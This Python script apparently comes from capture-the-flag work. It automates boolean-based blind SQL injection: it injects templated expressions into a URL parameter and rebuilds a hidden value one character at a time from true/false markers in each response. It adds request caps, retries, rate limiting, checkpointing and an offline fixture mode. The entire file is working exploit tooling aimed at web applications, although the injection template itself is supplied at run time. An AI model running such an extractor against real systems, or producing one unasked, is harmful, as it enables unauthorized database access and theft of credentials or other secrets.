#!/usr/bin/env python3
"""Bounded boolean-oracle extractor used when SQLMap cannot express a target.

The target and credentials are supplied through Secret Ref environment names;
the script never embeds challenge-specific URLs, cookies, tokens, or flags.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
from pathlib import Path
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen


def args_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Bounded boolean SQL injection extractor")
    parser.add_argument("--url-ref", default="CTF_TARGET_URL", help="Environment variable containing the target URL")
    parser.add_argument("--cookie-ref", default="CTF_COOKIE", help="Environment variable containing an optional Cookie header")
    parser.add_argument("--parameter", required=True)
    parser.add_argument("--true-marker", required=True)
    parser.add_argument("--false-marker", required=True)
    parser.add_argument("--query-template", required=True, help="Boolean expression with {position} and {character}")
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--max-requests", type=int, default=512)
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument("--retry", type=int, default=2)
    parser.add_argument("--rate-limit", type=float, default=0.0)
    parser.add_argument("--checkpoint", default="scripts/.solve_boolean_sqli.checkpoint.json")
    parser.add_argument("--resume", action="store_true")
    parser.add_argument("--output", default="scripts/result.json")
    parser.add_argument("--progress", default="scripts/progress.jsonl")
    parser.add_argument("--fixture", help="Offline JSON fixture mapping query strings to true/false")
    return parser


def load_fixture(path: str | None) -> dict[str, bool] | None:
    if not path:
        return None
    return {str(key): bool(value) for key, value in json.loads(Path(path).read_text(encoding="utf-8")).items()}


def request_boolean(url: str, parameter: str, expression: str, marker_true: str, marker_false: str, cookie: str, timeout: float, retries: int, fixture: dict[str, bool] | None) -> bool:
    if fixture is not None:
        if expression not in fixture:
            raise KeyError(f"fixture has no expression: {expression}")
        return fixture[expression]
    parts = urlsplit(url)
    query = dict(parse_qsl(parts.query, keep_blank_values=True))
    query[parameter] = expression
    request = Request(urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(query), parts.fragment)), headers={"Cookie": cookie} if cookie else {})
    last_error: Exception | None = None
    for attempt in range(retries + 1):
        try:
            body = urlopen(request, timeout=timeout).read().decode("utf-8", errors="replace")
            if marker_true in body:
                return True
            if marker_false in body:
                return False
            raise RuntimeError("response contains neither the true nor false marker")
        except Exception as error:  # bounded retry belongs to the script contract
            last_error = error
            if attempt < retries:
                time.sleep(min(2.0, 0.25 * (2**attempt)))
    raise RuntimeError(str(last_error))


def main(argv: list[str] | None = None) -> int:
    parser = args_parser()
    options = parser.parse_args(argv)
    if options.max_length < 1 or options.max_length > 4096 or options.max_requests < 1:
        parser.error("max-length/max-requests are outside the safe bounds")
    url = os.environ.get(options.url_ref)
    if not url and not options.fixture:
        parser.error(f"Secret Ref {options.url_ref!r} is not set")
    cookie = os.environ.get(options.cookie_ref, "")
    fixture = load_fixture(options.fixture)
    checkpoint_path = Path(options.checkpoint)
    result_path = Path(options.output)
    progress_path = Path(options.progress)
    checkpoint = {"position": 1, "value": "", "requests": 0}
    if options.resume and checkpoint_path.is_file():
        checkpoint.update(json.loads(checkpoint_path.read_text(encoding="utf-8")))
    position, value, requests = int(checkpoint["position"]), str(checkpoint["value"]), int(checkpoint["requests"])
    alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-/.:@"
    result = {"status": "RUNNING", "value": value, "requests": requests, "position": position}
    result_path.parent.mkdir(parents=True, exist_ok=True)
    progress_path.parent.mkdir(parents=True, exist_ok=True)
    try:
        with progress_path.open("a", encoding="utf-8") as progress:
            while position <= options.max_length and requests < options.max_requests:
                found = False
                for character in alphabet:
                    if requests >= options.max_requests:
                        break
                    expression = options.query_template.format(position=position, character=character)
                    outcome = request_boolean(url or "", options.parameter, expression, options.true_marker, options.false_marker, cookie, options.timeout, options.retry, fixture)
                    requests += 1
                    progress.write(json.dumps({"position": position, "character": character, "request": requests, "true": outcome}) + "\n")
                    progress.flush()
                    if options.rate_limit:
                        time.sleep(options.rate_limit)
                    if outcome:
                        value += character
                        found = True
                        break
                if not found:
                    break
                position += 1
                checkpoint_path.write_text(json.dumps({"position": position, "value": value, "requests": requests}), encoding="utf-8")
        result.update({"status": "COMPLETED", "value": value, "requests": requests, "position": position})
    except Exception as error:
        result.update({"status": "FAILED", "error": str(error), "value": value, "requests": requests, "position": position})
        result_path.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
        return 2
    result_path.write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
    return 0


if __name__ == "__main__":
    sys.exit(main())
